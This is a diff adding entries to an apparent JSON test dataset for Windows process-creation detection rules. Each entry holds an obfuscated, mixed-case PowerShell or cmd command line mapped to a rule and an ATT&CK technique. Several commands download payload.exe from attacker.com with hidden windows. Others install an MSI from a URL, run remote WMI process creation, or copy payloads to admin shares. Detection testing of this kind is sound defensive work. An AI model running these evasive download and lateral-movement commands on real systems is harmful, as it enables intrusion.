+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1218.005_017",
+    "target_commandline": "powershell.exe -WiNDOwSTYlE Hidden -\"Command\" \"$u='https://example.com/test.msi'; $i=New-Object -ComObject ('W' + 'indowsInstaller.Installer'); $i.UILevel=2; $i.InstallProduct($u, '')\"",
     "target_rule": "proc_creation_win_powershell_comobject_msi",
     "technique_id": "t1218.005",
     "shell": "cmd.exe",
@@ -19939,6 +21403,38 @@
     "test_id": "t1046_158",
     "target_commandline": "\"C:\\Users\\SWACHC~1\\AppData\\Local\\Temp\\2\\Advanced Port Scanner 2\\advanced_port_scanner.exe\" -portable \"C:/Users/SwachchhandaP/Downloads/\" -lng en_us",
     "target_rule": "proc_creation_win_pua_advanced_port_scanner",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_159",
+    "target_commandline": "powershell.exe /\"NoProfile\" -wINDOwSTYle Hidden /\"Command\" \"Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Domain, Username, Model\"",
+    "target_rule": "proc_creation_win_wmic_recon_computersystem",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_160",
+    "target_commandline": "powershell.exe -nop -wiNdOwsTyLe Hidden /\"Command\" \"Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Domain, Username, Model\"",
+    "target_rule": "proc_creation_win_wmic_recon_computersystem",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_161",
+    "target_commandline": "powershell.exe -nop -\"WindowStyle\" Hidden -c \"Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Domain, Username, Model\"",
+    "target_rule": "proc_creation_win_wmic_recon_computersystem",
+    "technique_id": "t1046",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1046_162",
+    "target_commandline": "powershell.exe /\"NoProfile\" /\"WindowStyle\" Hidden -COMManD \"Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Domain, Username, Model\"",
+    "target_rule": "proc_creation_win_wmic_recon_computersystem",
     "technique_id": "t1046",
     "shell": "cmd.exe",
     "mutation": "rerun_executable_false"
@@ -22080,6 +23576,70 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1087_186",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -NoProfile -WindowStyle Hidden -Command \"&{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgumentList '-x', 'application'}\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1087_187",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" -\"c\" \"powershell -nop -wINDoWstyLE Hidden -\"Command\" \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -\"ArgumentList\" \"-x'\" , 'application' }\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1087_188",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /C \"powershell -\"NoProfile\" -WIndowStYLe Hidden -\"Command\" \" &{Start-Process /\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArGUmENTlIst \"-x'\" , 'application' }\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1087_189",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -NoPrOfiLe -WiNDowstYLE Hidden -c \" &{Start-Process /\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgumentList '-X' , 'application' }\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1087_190",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /\"c\" \"powershell -nOpROfilE -WindOWStYLe Hidden -c \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' /\"ArgumentList\" \"-x'\" , 'application' }\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1087_191",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -noProfILe -wIndoWsTYle Hidden -CommanD \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgUMEntlist '-x' , 'application' }\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1087_192",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /C \"powershell -nop -\"WindowStyle\" Hidden -commAnD \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArguMenTlIst \"-x'\" , 'application' }\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1087_193",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" -\"c\" \"powershell -nop -wINDoWsTYle Hidden -\"Command\" \" &{Start-Process -\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' /\"ArgumentList\" \"-x'\" , 'application' }\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1087_194",
     "target_commandline": "cmd.exe /c \"& ipconfig & echo\"",
     "target_rule": "proc_creation_win_webshell_chopper",
@@ -22712,6 +24272,70 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1087_273",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -NoProfile -WindowStyle Hidden -Command \"&{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgumentList '-x', 'application'}\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1087_274",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" -\"c\" \"powershell -nop -wINDoWstyLE Hidden -\"Command\" \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -\"ArgumentList\" \"-x'\" , 'application' }\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1087_275",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /C \"powershell -\"NoProfile\" -WIndowStYLe Hidden -\"Command\" \" &{Start-Process /\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArGUmENTlIst \"-x'\" , 'application' }\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1087_276",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -NoPrOfiLe -WiNDowstYLE Hidden -c \" &{Start-Process /\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgumentList '-X' , 'application' }\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1087_277",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /\"c\" \"powershell -nOpROfilE -WindOWStYLe Hidden -c \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' /\"ArgumentList\" \"-x'\" , 'application' }\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1087_278",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -noProfILe -wIndoWsTYle Hidden -CommanD \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgUMEntlist '-x' , 'application' }\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1087_279",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /C \"powershell -nop -\"WindowStyle\" Hidden -commAnD \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArguMenTlIst \"-x'\" , 'application' }\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1087_280",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" -\"c\" \"powershell -nop -wINDoWsTYle Hidden -\"Command\" \" &{Start-Process -\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' /\"ArgumentList\" \"-x'\" , 'application' }\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1087_281",
     "target_commandline": "powershell.exe /\"Command\" \"Get-LocalGroupMember -Group 'Administrators'\"",
     "target_rule": "proc_creation_win_net_groups_and_accounts_recon",
@@ -23067,6 +24691,70 @@
     "test_id": "t1087.002_007",
     "target_commandline": "cmd /C \"copy C:\\Tools\\ADExplorer64.exe C:\\Windows\\System32\\sysinfo.exe && C:\\Windows\\System32\\sysinfo.exe -snapshot C:\\PerfLogs\\ad.db\"",
     "target_rule": "proc_creation_win_sysinternals_adexplorer_susp_execution",
+    "technique_id": "t1087.002",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1087.002_008",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -NoProfile -WindowStyle Hidden -Command \"&{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgumentList '-x', 'application'}\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087.002",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1087.002_009",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" -\"c\" \"powershell -nop -wINDoWstyLE Hidden -\"Command\" \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -\"ArgumentList\" \"-x'\" , 'application' }\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087.002",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1087.002_010",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /C \"powershell -\"NoProfile\" -WIndowStYLe Hidden -\"Command\" \" &{Start-Process /\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArGUmENTlIst \"-x'\" , 'application' }\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087.002",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1087.002_011",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -NoPrOfiLe -WiNDowstYLE Hidden -c \" &{Start-Process /\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgumentList '-X' , 'application' }\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087.002",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1087.002_012",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /\"c\" \"powershell -nOpROfilE -WindOWStYLe Hidden -c \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' /\"ArgumentList\" \"-x'\" , 'application' }\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087.002",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1087.002_013",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /c \"powershell -noProfILe -wIndoWsTYle Hidden -CommanD \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArgUMEntlist '-x' , 'application' }\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087.002",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1087.002_014",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" /C \"powershell -nop -\"WindowStyle\" Hidden -commAnD \" &{Start-Process -FilePath 'C:\\Windows\\Sysinternals\\psloglist64.exe' -ArguMenTlIst \"-x'\" , 'application' }\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
+    "technique_id": "t1087.002",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1087.002_015",
+    "target_commandline": "\"C:\\Windows\\System32\\cmd.exe\" -\"c\" \"powershell -nop -wINDoWsTYle Hidden -\"Command\" \" &{Start-Process -\"FilePath\" 'C:\\Windows\\Sysinternals\\psloglist64.exe' /\"ArgumentList\" \"-x'\" , 'application' }\"\"",
+    "target_rule": "proc_creation_win_sysinternals_psloglist",
     "technique_id": "t1087.002",
     "shell": "cmd.exe",
     "mutation": "rerun_executable_false"
@@ -24288,6 +25976,22 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1021.003_003",
+    "target_commandline": "powershell.exe -nop -\"WindowStyle\" Hidden -c \"Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c ipconfig > \\\\127.0.0.2\\ADMIN$\\output.txt' -ComputerName 10.0.0.5\"",
+    "target_rule": "proc_creation_win_hktl_impacket_lateral_movement",
+    "technique_id": "t1021.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1021.003_004",
+    "target_commandline": "powershell.exe /\"NoProfile\" -WInDowSTyle Hidden /\"Command\" \"Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c ipconfig > \\\\127.0.0.2\\ADMIN$\\output.txt' -ComputerName 10.0.0.5\"",
+    "target_rule": "proc_creation_win_hktl_impacket_lateral_movement",
+    "technique_id": "t1021.003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1039_010",
     "target_commandline": "cmd.exe /c \"type C:\\temp\\payload.exe > \\\\10.0.0.2\\Admin\\payload.exe\"",
     "target_rule": "proc_creation_win_susp_copy_lateral_movement",
@@ -24356,6 +26060,22 @@
     "target_commandline": "powershell -\"NoProfile\" -COmmaNd \"[System.IO.File]::Copy('C:\\temp\\test.txt','\\\\server\\C$\\temp\\test.txt')\"",
     "target_rule": "proc_creation_win_susp_copy_lateral_movement",
     "technique_id": "t1039",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_325",
+    "target_commandline": "powershell.exe -nop -\"WindowStyle\" Hidden -c \"Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c ipconfig > \\\\127.0.0.2\\ADMIN$\\output.txt' -ComputerName 10.0.0.5\"",
+    "target_rule": "proc_creation_win_hktl_impacket_lateral_movement",
+    "technique_id": "t1047",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1047_326",
+    "target_commandline": "powershell.exe /\"NoProfile\" -WInDowSTyle Hidden /\"Command\" \"Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c ipconfig > \\\\127.0.0.2\\ADMIN$\\output.txt' -ComputerName 10.0.0.5\"",
+    "target_rule": "proc_creation_win_hktl_impacket_lateral_movement",
+    "technique_id": "t1047",
     "shell": "cmd.exe",
     "mutation": "rerun_executable_false"
   },
@@ -26208,6 +27928,30 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1003_028",
+    "target_commandline": "powershell.exe /\"WindowStyle\" Hidden /\"NoProfile\" -COmMAnd \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1003_029",
+    "target_commandline": "powershell.exe -WINdOwStYLE Hidden /\"NoProfile\" -cOMMAND \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1003_030",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -\"NoProfile\" /\"Command\" \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1003",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1003_031",
     "target_commandline": "powershell.exe /\"Command\" \"Get-Process | Where-Object { $_.Modules.ModuleName -contains 'rdpcorets.dll' }\"",
     "target_rule": "proc_creation_win_tasklist_module_enumeration",
@@ -26624,6 +28368,30 @@
     "mutation": "rerun_executable_false"
   },
   {
+    "test_id": "t1027_126",
+    "target_commandline": "powershell.exe /\"WindowStyle\" Hidden /\"NoProfile\" -COmMAnd \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1027",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1027_127",
+    "target_commandline": "powershell.exe -WINdOwStYLE Hidden /\"NoProfile\" -cOMMAND \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1027",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1027_128",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -\"NoProfile\" /\"Command\" \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1027",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
     "test_id": "t1027_129",
     "target_commandline": "cmd.exe /c \"C:\\temp\\update_service.exe -p^rocess lsass.exe -m c^omsvcs\"",
     "target_rule": "proc_creation_win_hktl_xordump",
@@ -26796,6 +28564,30 @@
     "target_commandline": "powershell.exe -\"ep\" bypass -FILE C:\\temp\\audit.ps1",
     "target_rule": "proc_creation_win_hktl_winpwn",
     "technique_id": "t1106",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1134_007",
+    "target_commandline": "powershell.exe /\"WindowStyle\" Hidden /\"NoProfile\" -COmMAnd \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1134",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1134_008",
+    "target_commandline": "powershell.exe -WINdOwStYLE Hidden /\"NoProfile\" -cOMMAND \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1134",
+    "shell": "cmd.exe",
+    "mutation": "rerun_executable_false"
+  },
+  {
+    "test_id": "t1134_009",
+    "target_commandline": "powershell.exe -\"WindowStyle\" Hidden -\"NoProfile\" /\"Command\" \"Invoke-WebRequest -Uri http://attacker.com/payload.exe -OutFile C:\\temp\\payload.exe\"",
+    "target_rule": "proc_creation_win_susp_system_user_anomaly",
+    "technique_id": "t1134",
     "shell": "cmd.exe",
     "mutation": "rerun_executable_false"
   },
